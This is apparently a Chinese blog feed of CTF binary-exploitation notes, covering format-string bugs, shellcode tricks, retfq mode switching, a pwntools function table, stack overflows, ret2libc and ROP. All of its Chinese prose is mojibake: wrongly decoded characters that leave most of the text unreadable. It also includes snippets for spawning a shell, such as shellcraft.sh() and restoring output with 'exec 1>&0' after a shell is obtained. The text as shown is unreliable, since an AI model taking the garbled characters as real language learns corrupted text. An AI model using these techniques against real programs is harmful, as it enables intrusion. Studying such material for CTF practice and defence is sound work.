<p>è·å–fini.arrayåœ°å€æœ‰ä¸¤ç§æ–¹å¼ï¼š1ã€<code>fini_array = elf.sym[&quot;__init_array_end&quot;]</code>   2ã€ä½¿ç”¨<code>readelf -s æ–‡ä»¶å</code>å‘½ä»¤å»æŸ¥æ‰¾<code>__init_array_end</code>çš„åœ°å€</p>
<p>34ã€å¦‚æœæŠŠ0x80000000èµ‹å€¼ç»™aï¼Œè€Œa = -aï¼Œé‚£ä¹ˆaè¿˜æ˜¯ç­‰äº0x80000000</p>
<p>35ã€ç”¨libcå¯»æ‰¾/bin/shåœ°å€ï¼Œè¦è¿™ä¹ˆå†™binsh = libc_base + next(libc.search(â€˜/bin/shâ€™))</p>
<p>36ã€scanf(buf,buf)ï¼Œå¦‚æœæ˜¯ä»¥è¿™æ ·çš„å½¢å¼å‡ºç°è¾“å…¥ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªbufæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œscanfä½¿ç”¨äº†æˆ‘ä»¬çš„è¾“å…¥ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå› æ­¤ä¼šå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®¡ç®—åç§»éœ€è¦é€šè¿‡gdbè°ƒè¯•ï¼ˆå¿…é¡»åœ¨ç›¸åº”çš„ç‰ˆæœ¬ä¸‹è°ƒè¯•ï¼‰</p>
<p>%n$sï¼ˆnæ˜¯åç§»ï¼Œsæ˜¯è¾“å…¥çš„å½¢å¼ä»¥å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹æ˜¯ä»¥åç§»ç‚¹ä½œä¸ºæŒ‡é’ˆè¾“å…¥çš„ï¼‰</p>
<p>37ã€å½“ç¨‹åºå­˜åœ¨close(1)ä»¥åŠclose(2)ï¼šä»£è¡¨å…³é—­äº†linuxé‡Œé¢çš„æ ‡å‡†è¾“å‡º(1)å’Œæ ‡å‡†é”™è¯¯(2)ï¼Œæ‰€ä»¥å³ä½¿å·²ç»getshelläº†ï¼Œæˆ‘ä»¬æ˜¯çœ‹ä¸åˆ°è¾“å‡ºçš„ï¼Œæ‰€ä»¥è¿™æ—¶å€™è¾“å…¥<code>exec 1&gt;&amp;0</code>å°±å¯ä»¥è®©æ ‡å‡†è¾“å‡ºçš„æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘ä¸º0ï¼Œè€Œ0æ²¡è¢«å…³é—­ï¼ˆ0ï¼Œ1ï¼Œ2æ˜¯é»˜è®¤å¼€å¯çš„ï¼‰ï¼Œæ‰èƒ½çœ‹åˆ°è¾“å‡º</p>
<p>38ã€glibcç‰ˆæœ¬ä»…é™äºlibc-2.26åŠä»¥ä¸‹ï¼šå½“flagä¿å­˜åœ¨æ ˆä¸Šã€bssç­‰åœ°æ–¹æ—¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æ ˆä¸Šmainå‡½æ•°çš„argv[0]ï¼ˆæ–‡ä»¶è·¯å¾„ï¼‰ï¼Œæ”¹ä¸ºflagçš„åœ°å€ï¼Œç„¶åstack check failä¼šæ‰“å°ç¯å¢ƒå˜é‡çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œå³å¯æ‰“å°å‡ºflagï¼Œé«˜ç‰ˆæœ¬å¢åŠ äº†é™åˆ¶ï¼Œä¸ä¼šå†æ‰“å°å‡ºæ–‡ä»¶è·¯å¾„</p>
<p>39ã€å½“é‡åˆ°ä¸€äº›é¢˜ç›®éœ€è¦åœ¨shellcodeå‰é¢åŠ ä¸Šâ€™\x00â€™æ‰èƒ½ç»•è¿‡æ—¶ï¼Œå› ä¸ºâ€™\x00â€™æ˜¯ä¼šå½±å“åˆ°shellcodeè§£æçš„ï¼Œæ‰€ä»¥è¦è®©â€™\x00â€™å‡‘æˆæœ‰æ„ä¹‰çš„æŒ‡ä»¤å´åˆä¸èƒ½å½±å“åˆ°shellcodeï¼ˆåº•ä¸‹çš„æœºå™¨ç åœ¨32ä½å’Œ64ä½ä¸­éƒ½æ˜¯ä¸€æ ·çš„ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">00 40 00                 add    BYTE PTR [rax+0x0],  al<br>00 41 00                 add    BYTE PTR [rcx+0x0],  al<br>00 42 00                 add    BYTE PTR [rdx+0x0],  al<br>00 43 00                 add    BYTE PTR [rbx+0x0],  al<br>00 45 00                 add    BYTE PTR [rbp+0x0],  al<br>00 46 00                 add    BYTE PTR [rsi+0x0],  al<br>00 47 00                 add    BYTE PTR [rdi+0x0],  al<br></code></pre></td></tr></table></figure>

<p>40ã€åœ¨æœ¬åœ°å…³é—­ç¨‹åºä¸­çš„alarmå‡½æ•°</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> å°†ç¨‹åºåä¸ºProgrammNameä¸­çš„alarmæ›¿æ¢ä¸ºisnan</span><br><span class="hljs-meta">&gt;</span><span class="bash"> sed -i s/alarm/isnan/g ./ProgrammName</span><br></code></pre></td></tr></table></figure>

<p>41ã€mprotectä¿®æ”¹å†…å­˜æƒé™çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯èµ·å§‹åœ°å€ï¼Œä¿®æ”¹çš„é•¿åº¦å¿…é¡»æ˜¯é¡µçš„å€æ•°</p>
<p>42ã€<em><em>int snprintf(char</em> dest_str,size_t size,const char</em> format,â€¦);**</p>
<p>å°†å¯å˜ä¸ªå‚æ•°(â€¦)æŒ‰ç…§formatæ ¼å¼åŒ–æˆå­—ç¬¦ä¸²ï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ°strä¸­ã€‚è¿”å›å€¼ä¸ºæ¬²å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦</p>
<p>è¿™ä¸ªå‡½æ•°æœ‰ä¸ªæ¼æ´ï¼Œå› ä¸ºè¿”å›å€¼æ˜¯æ¬²å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¢«å¤åˆ¶çš„å­—ç¬¦ä¸²å¾ˆé•¿ï¼Œåˆèƒ½è¢«åŠ è½½ï¼ˆæ¯”å¦‚%sï¼‰é‚£è¿”å›å€¼å°±å¯èƒ½å¾ˆå¤§ï¼Œå¦‚æœä»¥è¿™ä¸ªä½œä¸ºæŸç§è¾“å…¥çš„å€¼å°±æœ‰äº§ç”Ÿæº¢å‡º</p>
<p>43ã€ç¨‹åºæ˜¯é€šè¿‡cså¯„å­˜å™¨åˆ¤æ–­æ˜¯64ä½è¿˜æ˜¯32ä½ï¼Œcs == 0x23ä»£è¡¨32ä½æ¨¡å¼ï¼Œcs == 0x33ä»£è¡¨64ä½æ¨¡å¼ï¼Œè€Œcså¯„å­˜å™¨å¯ä»¥é€šè¿‡<code>retfq</code>æ±‡ç¼–æŒ‡ä»¤æ¥ä¿®æ”¹</p>
<p>retfqæœ‰ä¸¤æ­¥æ“ä½œï¼š<code>retä»¥åŠset cs</code>ï¼Œæ‰€ä»¥æ‰§è¡Œretfqä¼šè·³è½¬åˆ°rspåŒæ—¶å°†csè®¾ç½®ä¸º[rsp+0x8]ï¼Œæˆ‘ä»¬åªéœ€è¦äº‹å…ˆåœ¨retä½ç½®å†™å…¥32ä½çš„shellcodeå°±å¯ä»¥æ‰§è¡Œäº†ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œretfqè·³è½¬è¿‡å»çš„æ—¶å€™ç¨‹åºå·²ç»åˆ‡æ¢æˆäº†32ä½æ¨¡å¼ï¼Œæ‰€ä»¥åœ°å€è§£æä¹Ÿæ˜¯ä»¥32ä½çš„è§„åˆ™æ¥çš„ï¼Œæ‰€ä»¥å¦‚åŸå…ˆçš„<code>rsp = 0x7ffe530d01b8</code>ä¼šè¢«è§£ææˆ<code>esp = 0x530d01b8</code></p>
]]></content>
  </entry>
  <entry>
    <title>åˆå…¥PWN</title>
    <url>/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/</url>
    <content><![CDATA[<p>å‰æå·¥å…·é…ç½®ï¼š</p>
<p>ï¼ˆ1ï¼‰Linuxç³»ç»Ÿè™šæ‹Ÿæœºï¼šé…ç½®python3 ã€å®‰è£…pwntoolsçš„pwnæ¨¡å—ã€å®‰è£…gdbã€å®‰è£…pipï¼ˆå…¶ä»–çš„å·¥å…·åœ¨åšé¢˜é‡åˆ°æ—¶å†å»å®‰è£…ï¼‰</p>
<p>ï¼ˆ2ï¼‰æœ¬æœºIDA proé™æ€è°ƒè¯•å™¨å’ŒOllydbgåŠ¨æ€è°ƒå¼å™¨ï¼ˆä¸¤ä¸ªéƒ½è¦æœ‰32bitä»¥åŠ64bitçš„ç‰ˆæœ¬ï¼‰</p>
<p>è¯­æ³•è¦æ±‚ï¼š</p>
<p>ï¼ˆ1ï¼‰æ±‡ç¼–è¯­æ³•</p>
<p>ï¼ˆ2ï¼‰cè¯­è¨€ï¼ˆc++æœ€å¥½ä¹ŸæŒæ¡ï¼Œä¸è¿‡è¿™æ¯”è¾ƒå°‘è§ï¼‰</p>
<p>ï¼ˆ3ï¼‰python</p>
<p>ï¼ˆ4ï¼‰javaï¼ˆåé¢çš„è¡¥å……å­¦ä¹ ï¼Œæ–°æ‰‹æ²¡å¿…è¦å­¦ï¼‰</p>
<p>å·¥å…·ä½¿ç”¨è¦æ±‚ï¼š</p>
<p>ï¼ˆ1ï¼‰å­¦ä¼šIDAçš„é™æ€è°ƒè¯•</p>
<p>ï¼ˆ2ï¼‰å­¦ä¼šgdbçš„åŠ¨æ€è°ƒè¯•</p>
<p>ï¼ˆ3ï¼‰pwntoolsçš„ä½¿ç”¨</p>
<p>â€‹    Â·Â·Â·Â·Â·Â·Â·</p>
<p>ä¸€ã€PWNæ¨¡å—ä¸­ç”¨åˆ°çš„å‡½æ•°</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>ç”¨é€”</th>
</tr>
</thead>
<tbody><tr>
<td>send(data)</td>
<td>å‘é€æ•°æ®ï¼ˆå­—ç¬¦ä¸²å½¢å¼å‘é€ï¼‰</td>
</tr>
<tr>
<td>sendline(data)</td>
<td>å‘é€ä¸€è¡Œæ•°æ®ï¼Œé»˜è®¤åœ¨è¡Œå°¾åŠ  \nï¼ˆå­—ç¬¦ä¸²å½¢å¼å‘é€ï¼‰</td>
</tr>
<tr>
<td>recv(numb=1096,timeout=default)</td>
<td>æ¥æ”¶æŒ‡å®šå­—èŠ‚æ•°çš„æ•°æ®</td>
</tr>
<tr>
<td>buf = p.recvuntil(â€œ\nâ€, drop=True)</td>
<td>ç›´åˆ°æ¥æ”¶åˆ°\nä¸ºæ­¢ï¼Œdrop=Trueè¡¨ç¤ºä¸¢å¼ƒ\nï¼Œbufä¸ºæ¥æ”¶åˆ°çš„è¾“å‡ºä½†ä¸åŒ…æ‹¬ä¸¢å¼ƒçš„\n</td>
</tr>
<tr>
<td>recvrepeat(timeout=default)</td>
<td>æ¥æ”¶æ•°æ®ç›´åˆ° EOF æˆ– timeout</td>
</tr>
<tr>
<td>recvall()</td>
<td>æ¥æ”¶æ•°æ®ç›´åˆ° EOF</td>
</tr>
<tr>
<td>recvline(keepends=True)</td>
<td>æ¥æ”¶ä¸€è¡Œï¼Œå¯é€‰æ‹©æ˜¯å¦ä¿ç•™è¡Œå°¾çš„ \n</td>
</tr>
<tr>
<td>listen(ç«¯å£)</td>
<td>å¼€å¯ä¸€ä¸ªæœ¬åœ°çš„ç›‘å¬ç«¯å£</td>
</tr>
<tr>
<td>remote(â€˜IPåœ°å€â€™, ç«¯å£)</td>
<td>ä¸ç›®æ ‡IPå»ºç«‹ä¸€ä¸ªå¥—æ¥å­—ç®¡é“ä¸ä¹‹è¿œç¨‹äº¤äº’ï¼ˆåœ¨çº¿çš„ï¼‰</td>
</tr>
<tr>
<td>interactive()</td>
<td>å¯åŒæ—¶è¯»å†™ç®¡é“ï¼Œç›¸å½“äºå›åˆ° shell æ¨¡å¼è¿›è¡Œäº¤äº’ï¼Œåœ¨å–å¾— shell ä¹‹åè°ƒç”¨</td>
</tr>
<tr>
<td>p8() p16()   p32()   p64()</td>
<td>æŠŠæ‹¬å·å†…æ•°æ®æ‰“åŒ…æˆ8ä½/6ä½/32ä½/64ä½çš„äºŒè¿›åˆ¶æ•°</td>
</tr>
<tr>
<td>u8() u16()  u32()   u64()</td>
<td>æŠŠæ‹¬å·å†…å­—ç¬¦ä¸²è§£åŒ…æˆäºŒè¿›åˆ¶æ•°</td>
</tr>
<tr>
<td>process(â€˜æ–‡ä»¶è·¯å¾„â€™)</td>
<td>ä¸æœ¬åœ°æ–‡ä»¶å»ºç«‹ä¸€ä¸ªäº¤äº’é€šé“</td>
</tr>
<tr>
<td>sendlineafter(â€œstringâ€,payload)</td>
<td>æ¥æ”¶åˆ°stringåå‘é€payload</td>
</tr>
<tr>
<td>close()</td>
<td>å…³é—­äº¤äº’çš„é€šé“</td>
</tr>
<tr>
<td>ELF(â€˜æ–‡ä»¶è·¯å¾„â€™)</td>
<td>è·å–æ–‡ä»¶å¯¹è±¡æˆ–è€…libcåº“å¯¹è±¡</td>
</tr>
<tr>
<td>plt[â€˜å‡½æ•°åâ€™]</td>
<td>è·å–å‡½æ•°åœ¨PLTè¡¨ä¸­çš„åœ°å€</td>
</tr>
<tr>
<td>got[â€˜å‡½æ•°åâ€™]</td>
<td>è·å–å‡½æ•°åœ¨GOTè¡¨ä¸­çš„åœ°å€</td>
</tr>
<tr>
<td>symbols[â€˜å‡½æ•°åâ€™]<br>æˆ–sym[â€˜å‡½æ•°åâ€™]</td>
<td>è·å–å‡½æ•°pltåœ°å€ï¼Œç”¨åœ¨libcé‡Œé¢å°±æ˜¯è·å–libcé‡Œçš„åç§»åœ°å€</td>
</tr>
<tr>
<td>asm(â€œæ±‡ç¼–æŒ‡ä»¤â€)</td>
<td>æŠŠæ±‡ç¼–æŒ‡ä»¤è½¬æ¢æˆå¯¹åº”çš„æœºå™¨ç ï¼Œæœºå™¨ç æ˜¯ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›</td>
</tr>
<tr>
<td>bss(offset)</td>
<td>è¿”å› .bss æ®µåŠ ä¸Š offset åçš„åœ°å€</td>
</tr>
<tr>
<td>asm(shellcraft.amd64.linux.sh()ï¼Œarch=â€™amd64â€™)ï¼ˆè¿™é‡Œæ˜¯æŒ‡æ˜x64ç¯å¢ƒï¼Œå¦‚æœå·²ç»æœ‰contextè®¾ç½®ç¯å¢ƒå°±ç›´æ¥å†™ä¸ºasm(shellcraft.sh())ï¼‰</td>
<td>ç”Ÿæˆshellcode,ä¸€èˆ¬ä¸asmè¿›è¡Œè”ç”¨ï¼Œè½¬ä¸ºå¯¹åº”æœºå™¨ç </td>
</tr>
<tr>
<td>context(arch=â€™amd64â€™æˆ–â€˜i386â€™,os=â€™linuxâ€™,log_level=â€™debugâ€™)</td>
<td>è®¾ç½®ç¯å¢ƒ</td>
</tr>
<tr>
<td>gdb.attach(p,â€™b* mainâ€™)</td>
<td>è°ƒåŠ¨gdbè¿›è¡Œè„šæœ¬è°ƒå¼</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h2><h3 id="ä¸€ã€x86æ¶æ„ä¸‹çš„æ ˆæº¢å‡º"><a href="#ä¸€ã€x86æ¶æ„ä¸‹çš„æ ˆæº¢å‡º" class="headerlink" title="ä¸€ã€x86æ¶æ„ä¸‹çš„æ ˆæº¢å‡º"></a>ä¸€ã€x86æ¶æ„ä¸‹çš„æ ˆæº¢å‡º</h3><p>æ ˆåŒºï¼šç®€å•æ¥è¯´å°±æ˜¯cè¯­è¨€ä¸­åˆ›å»ºçš„å±€éƒ¨å˜é‡ï¼ˆä¾‹å¦‚å‡½æ•°èŠ±æ‹¬å·é‡Œçš„å˜é‡ï¼‰çš„å­˜å‚¨ä½ç½®ã€‚å†…å­˜ä¸­çš„æ ˆåŒºæŒ‡çš„æ˜¯ç³»ç»Ÿæ ˆï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨ç»´æŠ¤ã€‚</p>
<p>æ ˆåœ¨ç¨‹åºåŠ è½½è¿›å†…å­˜åå°±ä¼šå‡ºç°</p>
<p>å…¥æ ˆï¼šæ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªå±äºè‡ªå·±çš„æ ˆå¸§ç©ºé—´ï¼Œæœ€å…ˆå‹å…¥æ ˆå†…çš„æ˜¯å‡½æ•°çš„è¿”å›åœ°å€ï¼ˆç”¨æ¥è¿”å›åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼‰ï¼Œä¹‹åæ˜¯å‡½æ•°çš„åŸºåœ°å€ã€å‚æ•°å…¥æ ˆã€‚ä¾‹å¦‚ä¸»è°ƒå‡½æ•°åœ¨è°ƒç”¨å‡½æ•°aæ—¶ï¼Œä¸»è°ƒå‡½æ•°å…ˆå­˜å…¥è‡ªèº«æ ˆå¸§çš„ä¸ºè¿”å›åœ°å€ã€è‡ªèº«åŸºåœ°å€ã€ä¼ å…¥å‡½æ•°açš„å®å‚ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ï¼Œç„¶åæ›¿å‡½æ•°aåˆ›å»ºä¸€ä¸ªæ–°æ ˆå¸§ï¼Œåœ¨æ–°æ ˆå¸§ä¸­å…ˆå‹å…¥å‡½æ•°açš„è¿”å›åœ°å€ï¼ˆä¸ºäº†å‡½æ•°è°ƒç”¨ç»“æŸæ—¶ï¼Œå¯ä»¥è¿”å›åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ç»§ç»­ç¨‹åºï¼‰ï¼Œå†å‹å…¥ä¸»è°ƒå‡½æ•°çš„åŸºåœ°å€ï¼ˆå‡½æ•°è°ƒç”¨ç»“æŸæ—¶ï¼Œè¿”å›åˆ°ä¸»è°ƒå‡½æ•°çš„åŸºåœ°å€ï¼‰ä»¥åŠå‡½æ•°aä¸­çš„å±€éƒ¨å˜é‡ã€‚æ­¤æ—¶æ˜¯é«˜åœ°å€å¾€ä½åœ°å€ç”Ÿé•¿ï¼ˆä¸»è°ƒå‡½æ•°åœ¨çš„ä½ç½®ä¸ºé«˜åœ°å€ï¼‰</p>
<p>é€€æ ˆï¼šè€Œå‡½æ•°è°ƒç”¨ç»“æŸï¼Œåˆ™ä¸è°ƒç”¨æ—¶ç›¸åï¼Œå…ˆä»è¢«è°ƒå‡½æ•°çš„å±€éƒ¨å˜é‡å¼€å§‹ç›´æ¥å¼¹å‡ºæ ˆï¼Œæ ˆé¡¶æŒ‡å‘å­˜å‚¨ç€è¢«è°ƒå‡½æ•°åŸºåœ°å€ï¼ˆå­˜å‚¨ä¸»è°ƒå‡½æ•°åŸºåœ°å€ï¼‰ï¼Œè¢«è°ƒå‡½æ•°åŸºåœ°å€è¢«å¼¹å‡ºåï¼Œé‡Šæ”¾å‡ºä¸»è°ƒå‡½æ•°çš„åŸºåœ°å€ç»™ebpï¼Œç„¶åå°†è¿”å›åœ°å€å¼¹å‡ºäº¤ç»™eipå»æ‰§è¡Œï¼Œä¹‹åä¾¿è¿”å›åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼ˆè¿™é‡Œä¸¾ä¾‹ä¸ºä¸»è°ƒå‡½æ•°ç›´æ¥è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœå±‚å±‚åµŒå¥—ï¼Œåˆ™å…ˆä¼šè¿”å›åˆ°ä¸Šä¸€ä¸ªä¸»è°ƒå‡½æ•°çš„æ ˆå¸§ï¼‰ï¼Œç»§ç»­ç¨‹åºçš„è¿è¡Œï¼ŒebpæŒ‡å‘æ­¤åˆ»çš„ä¸»è°ƒå‡½æ•°çš„åŸºåœ°å€</p>
<p>ç³»ç»Ÿä¸­å½“å‰æ­£åœ¨è¿è¡Œçš„å‡½æ•°æ€»æ˜¯åœ¨æ ˆé¡¶</p>
<p>ä¸å‡½æ•°çŠ¶æ€ç›¸å…³çš„ä¸»è¦å¯„å­˜å™¨ï¼šespï¼Œebpï¼Œeipï¼š</p>
<p>ï¼ˆ1ï¼‰espï¼šæ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæ­£åœ¨è¿è¡Œçš„æ ˆå¸§çš„æ ˆé¡¶ï¼ˆå­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€ï¼‰ï¼Œåœ¨å‹æ ˆå’Œé€€æ ˆæ—¶å‘ç”Ÿå˜åŒ–</p>
<p>ï¼ˆ2ï¼‰ebpï¼šåŸºåœ°å€æŒ‡é’ˆå¯„å­˜å™¨ï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæ­£åœ¨è¿è¡Œçš„æ ˆå¸§çš„åº•éƒ¨ï¼Œåœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜ï¼Œå¯ä»¥ç”¨æ¥ç´¢å¼•ç¡®å®šå‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½® </p>
<p>ï¼ˆ3ï¼‰åœ¨espå’Œebpä¹‹é—´çš„å†…å­˜ç©ºé—´ä¸ºå½“å‰æ ˆå¸§</p>
<p>ï¼ˆ4ï¼‰eipï¼šç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€ï¼Œcpu ä¾ç…§ eip çš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œeip éšä¹‹æŒ‡å‘ç›¸é‚»çš„ä¸‹ä¸€æ¡æŒ‡ä»¤</p>
<p>å› æ­¤ï¼Œæ‰€è°“çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œå°±æ˜¯åˆ©ç”¨ä¸€äº›å±é™©å‡½æ•°è¿›è¡Œè¯»å–è¿œè¶…ä¸€ä¸ªå˜é‡æ‰€éœ€çš„æ•°å€¼ï¼Œè¦†ç›–åˆ°ç›¸é‚»æ ˆä¸­çš„æ•°å€¼ï¼Œä»è€Œä¿®æ”¹ç›¸é‚»æ ˆä¸­çš„å˜é‡çš„å€¼ï¼Œå¾€è¿™äº›ä¿®æ”¹çš„å€¼ä¸­æ³¨å…¥æˆ‘ä»¬æ‰€éœ€è¦çš„è·³è½¬çš„ä¾‹å¦‚shellcodeï¼Œå‡½æ•°åœ°å€ç­‰ï¼Œä½¿ç¨‹åºå´©åæˆ–æ˜¯è®©ç¨‹åºæ‰§è¡Œä¸€äº›æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ç¨‹åºï¼Œè¾¾åˆ°ç ´åçš„ç›®çš„</p>
<p>x86ä¸‹çš„CPUåŒ…å«çš„8ä¸ªå››å­—èŠ‚çš„é€šç”¨å¯„å­˜å™¨ï¼š</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/271639137915732.jpg"></p>
<p>å¯„å­˜å™¨ä½¿ç”¨çº¦å®šï¼šå¯„å­˜å™¨eaxã€edxå’Œecxä¸ºä¸»è°ƒå‡½æ•°ä¿å­˜å¯„å­˜å™¨(caller-saved registers)ï¼Œå½“å‡½æ•°è°ƒç”¨æ—¶ï¼Œè‹¥ä¸»è°ƒå‡½æ•°å¸Œæœ›ä¿æŒè¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Œåˆ™å¿…é¡»åœ¨è°ƒç”¨å‰æ˜¾å¼åœ°å°†å…¶ä¿å­˜åœ¨æ ˆä¸­ï¼›è¢«è°ƒå‡½æ•°å¯ä»¥è¦†ç›–è¿™äº›å¯„å­˜å™¨ï¼Œè€Œä¸ä¼šç ´åä¸»è°ƒå‡½æ•°æ‰€éœ€çš„æ•°æ®ã€‚å¯„å­˜å™¨ebxã€esiå’Œediä¸ºè¢«è°ƒå‡½æ•°ä¿å­˜å¯„å­˜å™¨(callee-saved registers)ï¼Œå³è¢«è°ƒå‡½æ•°åœ¨è¦†ç›–è¿™äº›å¯„å­˜å™¨çš„å€¼æ—¶ï¼Œå¿…é¡»å…ˆå°†å¯„å­˜å™¨åŸå€¼å‹å…¥æ ˆä¸­ä¿å­˜èµ·æ¥ï¼Œå¹¶åœ¨å‡½æ•°è¿”å›å‰ä»æ ˆä¸­æ¢å¤å…¶åŸå€¼ï¼Œå› ä¸ºä¸»è°ƒå‡½æ•°å¯èƒ½ä¹Ÿåœ¨ä½¿ç”¨è¿™äº›å¯„å­˜å™¨ã€‚æ­¤å¤–ï¼Œè¢«è°ƒå‡½æ•°å¿…é¡»ä¿æŒå¯„å­˜å™¨ebpå’Œespï¼Œå¹¶åœ¨å‡½æ•°è¿”å›åå°†å…¶æ¢å¤åˆ°è°ƒç”¨å‰çš„å€¼ï¼Œäº¦å³å¿…é¡»æ¢å¤ä¸»è°ƒå‡½æ•°çš„æ ˆå¸§ã€‚</p>
<h3 id="return-to-libc"><a href="#return-to-libc" class="headerlink" title="return to libc"></a><strong>return to libc</strong></h3><h4 id="â€”â€”æ„é€ system-â€œ-bin-shâ€œ"><a href="#â€”â€”æ„é€ system-â€œ-bin-shâ€œ" class="headerlink" title="â€”â€”æ„é€ system(â€œ/bin/shâ€œ)"></a>â€”â€”æ„é€ system(â€œ/bin/shâ€œ)</h4><p>ä½¿ç”¨å‰æï¼šASLRè¢«å…³é—­ï¼Œå†…å­˜ä¸­å­˜åœ¨å¯è¾¾åˆ°ç›®çš„çš„ç‰¹å®šå‡½æ•°</p>
<p>systemåœ°å€ï¼š<strong>åœ¨ASLR è¢«å…³é—­çš„å‰æä¸‹</strong>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·åœ¨è¿è¡Œç¨‹åºè¿‡ç¨‹ä¸­ç›´æ¥æŸ¥çœ‹ system() çš„åœ°å€ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹åŠ¨æ€åº“åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå†åœ¨åŠ¨æ€é“¾æ¥åº“å†…æŸ¥çœ‹å‡½æ•°çš„ç›¸å¯¹åç§»ä½ç½®ï¼Œé€šè¿‡è®¡ç®—å¾—åˆ°å‡½æ•°çš„ç»å¯¹åœ°å€ã€‚</p>
<p>/bin/shå­—ç¬¦ä¸²åœ°å€ï¼šå¯ä»¥åœ¨åŠ¨æ€åº“é‡Œæœç´¢è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±å¯ä»¥æŒ‰ç…§åŠ¨æ€åº“èµ·å§‹åœ°å€ï¼‹ç›¸å¯¹åç§»æ¥ç¡®å®šå…¶ç»å¯¹åœ°å€ã€‚å¦‚æœåœ¨åŠ¨æ€åº“é‡Œæ‰¾ä¸åˆ°ï¼Œå¯ä»¥å°†è¿™ä¸ªå­—ç¬¦ä¸²åŠ åˆ°ç¯å¢ƒå˜é‡é‡Œï¼Œå†é€šè¿‡getenv() ç­‰å‡½æ•°æ¥ç¡®å®šåœ°å€ã€‚</p>
<h3 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP ( Return Oriented Programming )"></a><strong>ROP ( Return Oriented Programming )</strong></h3><h4 id="â€”â€”ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤"><a href="#â€”â€”ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤" class="headerlink" title="â€”â€”ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤"></a>â€”â€”ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤</h4><p>åˆ©ç”¨ä¸€ä¸ªåŠä»¥ä¸Šçš„gadgetæ‰§è¡ŒæŒ‡ä»¤ï¼Œæœ€ç»ˆè°ƒç”¨èƒ½ä¿®æ”¹æƒé™çš„å‡½æ•°ï¼Œä¾‹å¦‚ç¼–å·ä¸º125çš„å‡½æ•°mprotect()å¯ä¿®æ”¹æ ˆçš„å±æ€§ï¼Œä»è€Œåˆ©ç”¨shellcodeã€‚è‹¥æ˜¯è¦è¿ç»­ä½¿ç”¨å¤šä¸ªgadgetæ—¶ä¸€å®šè¦æ‰¾å«æœ‰retæŒ‡ä»¤çš„ç‰‡æ®µ</p>
<p>è¢«è°ƒç”¨å‡½æ•°çš„ç¼–å·åº”å­˜å…¥ eaxï¼Œè°ƒç”¨å‚æ•°åº”æŒ‰é¡ºåºå­˜å…¥ ebxï¼Œecxï¼Œedxï¼Œesiï¼Œedi ä¸­</p>
